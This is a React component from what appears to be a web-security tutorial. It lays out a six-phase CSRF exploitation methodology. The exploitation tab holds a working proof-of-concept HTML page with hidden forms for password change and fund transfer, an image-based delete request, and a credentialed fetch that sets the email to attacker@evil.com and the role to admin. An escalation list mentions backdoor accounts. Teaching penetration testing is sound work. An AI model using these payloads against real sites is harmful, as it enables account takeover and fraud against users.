
import React from 'react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import CodeExample from '@/components/CodeExample';

const CSRFExploitationPhases: React.FC = () => {
  return (
    <div>
      <h4 className="text-xl font-semibold mb-4">Complete CSRF Exploitation Methodology</h4>
      <Tabs defaultValue="reconnaissance">
        <TabsList className="bg-slate-200 dark:bg-slate-800">
          <TabsTrigger value="reconnaissance">Phase 1: Reconnaissance</TabsTrigger>
          <TabsTrigger value="identification">Phase 2: Identification</TabsTrigger>
          <TabsTrigger value="analysis">Phase 3: Analysis</TabsTrigger>
          <TabsTrigger value="exploitation">Phase 4: Exploitation</TabsTrigger>
          <TabsTrigger value="verification">Phase 5: Verification</TabsTrigger>
          <TabsTrigger value="escalation">Phase 6: Escalation</TabsTrigger>
        </TabsList>
        
        <TabsContent value="reconnaissance" className="mt-4">
          <div className="space-y-4">
            <h5 className="font-semibold text-lg">Phase 1: Initial Reconnaissance and Target Mapping</h5>
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h6 className="font-medium mb-2">Information Gathering:</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Map out the complete application structure and functionality</li>
                <li>Identify all authentication mechanisms and session management</li>
                <li>Document user roles and privilege levels</li>
                <li>Catalog all forms, buttons, and interactive elements</li>
                <li>Understand the application's business logic and critical functions</li>
                <li>Identify single-page application (SPA) vs traditional multi-page architecture</li>
              </ul>
              
              <h6 className="font-medium mb-2 mt-3">Technology Stack Analysis:</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Determine server-side technology (PHP, ASP.NET, Node.js, Python, etc.)</li>
                <li>Identify client-side frameworks (React, Angular, Vue.js)</li>
                <li>Check for Content Management Systems (WordPress, Drupal, etc.)</li>
                <li>Analyze HTTP headers for security configurations</li>
                <li>Look for API endpoints and their documentation</li>
              </ul>
              
              <h6 className="font-medium mb-2 mt-3">User Journey Mapping:</h6>
              <ol className="list-decimal pl-6 space-y-1 text-sm">
                <li>Create user accounts with different privilege levels</li>
                <li>Map out complete user workflows for each role</li>
                <li>Document all state-changing operations</li>
                <li>Identify high-value targets (admin functions, financial operations)</li>
                <li>Note any multi-step processes or workflows</li>
              </ol>
            </div>
          </div>
        </TabsContent>
        
        <TabsContent value="identification" className="mt-4">
          <div className="space-y-4">
            <h5 className="font-semibold text-lg">Phase 2: Systematic Vulnerability Identification</h5>
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h6 className="font-medium mb-2">Form-Based Targets:</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Password change forms and account settings</li>
                <li>Profile update and personal information forms</li>
                <li>Financial transaction forms (transfers, payments)</li>
                <li>Administrative functions (user management, system settings)</li>
                <li>File upload and document management features</li>
                <li>Email settings and notification preferences</li>
                <li>Two-factor authentication setup/disable functions</li>
              </ul>
              
              <h6 className="font-medium mb-2 mt-3">API Endpoint Discovery:</h6>
              <CodeExample
                language="bash"
                title="API Endpoint Discovery Techniques"
                code={`# Using Burp Suite to capture all requests
# 1. Configure browser proxy to Burp Suite
# 2. Navigate through all application functions while logged in
# 3. Review Burp Site Map for all discovered endpoints

# JavaScript console inspection for SPA applications
# Check for API calls in browser developer tools
# Look for patterns like:
/api/user/update
/api/account/settings
/api/admin/users
/api/transfer/funds

# Common API endpoint patterns to test
GET /api/user/profile       # Usually safe from CSRF
POST /api/user/update       # Potential CSRF target
PUT /api/user/password      # High-value CSRF target
DELETE /api/user/account    # Critical CSRF target
POST /api/admin/promote     # Privilege escalation target

# Check for REST API documentation
/api/docs
/swagger
/api-docs
/documentation`}
              />
              
              <h6 className="font-medium mb-2 mt-3">Mobile and Alternative Interfaces:</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Mobile-specific endpoints and functionalities</li>
                <li>Alternative interfaces (admin panels, partner portals)</li>
                <li>Legacy endpoints that might lack modern protections</li>
                <li>Third-party integrations and webhooks</li>
              </ul>
            </div>
          </div>
        </TabsContent>
        
        <TabsContent value="analysis" className="mt-4">
          <div className="space-y-4">
            <h5 className="font-semibold text-lg">Phase 3: Protection Mechanism Analysis</h5>
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h6 className="font-medium mb-2">CSRF Token Analysis:</h6>
              <CodeExample
                language="javascript"
                title="Token Analysis Script"
                code={`// Automated CSRF token analysis
function analyzeCsrfProtection() {
  // Check for tokens in forms
  const forms = document.querySelectorAll('form');
  forms.forEach((form, index) => {
    console.log(\`Form \${index + 1}:\`);
    
    // Look for hidden CSRF token fields
    const tokenFields = form.querySelectorAll('input[type="hidden"]');
    tokenFields.forEach(field => {
      if (field.name.toLowerCase().includes('csrf') || 
          field.name.toLowerCase().includes('token') ||
          field.name === '_token' || 
          field.name === 'authenticity_token') {
        console.log(\`  CSRF Token found: \${field.name} = \${field.value}\`);
      }
    });
    
    // Check form action and method
    console.log(\`  Action: \${form.action}\`);
    console.log(\`  Method: \${form.method}\`);
  });
  
  // Check for tokens in meta tags
  const metaToken = document.querySelector('meta[name="csrf-token"]');
  if (metaToken) {
    console.log(\`Meta CSRF token: \${metaToken.getAttribute('content')}\`);
  }
}

// Run the analysis
analyzeCsrfProtection();`}
              />
              
              <h6 className="font-medium mb-2 mt-3">Cookie Security Analysis:</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Check SameSite attribute values (None, Lax, Strict)</li>
                <li>Verify HttpOnly and Secure flags</li>
                <li>Test cookie behavior in cross-site contexts</li>
                <li>Analyze session token entropy and randomness</li>
                <li>Check for session fixation vulnerabilities</li>
              </ul>
              
              <h6 className="font-medium mb-2 mt-3">Header-Based Protections:</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Origin header validation testing</li>
                <li>Referer header validation and bypass attempts</li>
                <li>Custom header requirements (X-Requested-With)</li>
                <li>Content-Type validation strictness</li>
              </ul>
            </div>
          </div>
        </TabsContent>
        
        <TabsContent value="exploitation" className="mt-4">
          <div className="space-y-4">
            <h5 className="font-semibold text-lg">Phase 4: Systematic Exploitation</h5>
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h6 className="font-medium mb-2">Basic Exploitation Techniques:</h6>
              <CodeExample
                language="html"
                title="Progressive CSRF Testing Template"
                code={`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Testing Laboratory</title>
    <style>
        .test-section { margin: 20px 0; padding: 15px; border: 1px solid #ccc; }
        .hidden-form { display: none; }
    </style>
</head>
<body>
    <h1>CSRF Exploitation Testing</h1>
    
    <!-- Test 1: Basic Form Submission -->
    <div class="test-section">
        <h3>Test 1: Direct Form Submission</h3>
        <form action="https://target.com/change-password" method="POST" id="test1">
            <input type="hidden" name="new_password" value="csrf_test_123">
            <input type="hidden" name="confirm_password" value="csrf_test_123">
            <button type="submit">Test Password Change</button>
        </form>
    </div>
    
    <!-- Test 2: Auto-submit Form -->
    <div class="test-section">
        <h3>Test 2: Automatic Form Submission</h3>
        <form action="https://target.com/transfer" method="POST" id="test2" class="hidden-form">
            <input type="hidden" name="recipient" value="attacker@test.com">
            <input type="hidden" name="amount" value="1.00">
        </form>
        <button onclick="document.getElementById('test2').submit()">Trigger Transfer</button>
    </div>
    
    <!-- Test 3: Image-based GET Request -->
    <div class="test-section">
        <h3>Test 3: Image-based Attack</h3>
        <img src="https://target.com/delete-user?id=123" style="display:none" onerror="console.log('Request sent')">
    </div>
    
    <!-- Test 4: JavaScript Fetch API -->
    <div class="test-section">
        <h3>Test 4: AJAX-based Attack</h3>
        <button onclick="performAjaxCSRF()">Execute AJAX CSRF</button>
    </div>
    
    <script>
        function performAjaxCSRF() {
            fetch('https://target.com/api/user/update', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'email=attacker@evil.com&role=admin'
            }).then(response => {
                console.log('CSRF request completed:', response.status);
            }).catch(error => {
                console.log('CSRF request failed:', error);
            });
        }
        
        // Auto-execute on page load
        window.onload = function() {
            // Uncomment to auto-execute tests
            // document.getElementById('test2').submit();
        };
    </script>
</body>
</html>`}
              />
            </div>
          </div>
        </TabsContent>
        
        <TabsContent value="verification" className="mt-4">
          <div className="space-y-4">
            <h5 className="font-semibold text-lg">Phase 5: Impact Verification and Documentation</h5>
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h6 className="font-medium mb-2">Verification Steps:</h6>
              <ol className="list-decimal pl-6 space-y-1 text-sm">
                <li>Confirm the malicious action was actually performed</li>
                <li>Check application logs for evidence of the attack</li>
                <li>Verify that no user interaction was required beyond visiting the page</li>
                <li>Test the attack across different browsers and devices</li>
                <li>Document the complete attack flow with screenshots</li>
                <li>Record network traffic showing the successful CSRF request</li>
                <li>Verify the attack works with different user privilege levels</li>
              </ol>
              
              <h6 className="font-medium mb-2 mt-3">Impact Assessment Framework:</h6>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-3">
                <div className="p-3 bg-red-900/20 rounded">
                  <div className="font-medium text-red-400">Critical Impact</div>
                  <ul className="list-disc pl-4 text-xs mt-1">
                    <li>Administrative account takeover</li>
                    <li>Financial transactions</li>
                    <li>System configuration changes</li>
                    <li>User privilege escalation</li>
                  </ul>
                </div>
                <div className="p-3 bg-yellow-900/20 rounded">
                  <div className="font-medium text-yellow-400">High Impact</div>
                  <ul className="list-disc pl-4 text-xs mt-1">
                    <li>Password changes</li>
                    <li>Email modifications</li>
                    <li>Profile data changes</li>
                    <li>Security setting modifications</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </TabsContent>
        
        <TabsContent value="escalation" className="mt-4">
          <div className="space-y-4">
            <h5 className="font-semibold text-lg">Phase 6: Attack Escalation and Chaining</h5>
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h6 className="font-medium mb-2">Privilege Escalation via CSRF:</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Chain CSRF with other vulnerabilities (XSS, IDOR)</li>
                <li>Use CSRF to modify admin user accounts</li>
                <li>Exploit CSRF in password reset functionality</li>
                <li>Leverage CSRF to disable security features</li>
                <li>Use CSRF to create backdoor accounts</li>
              </ul>
            </div>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default CSRFExploitationPhases;
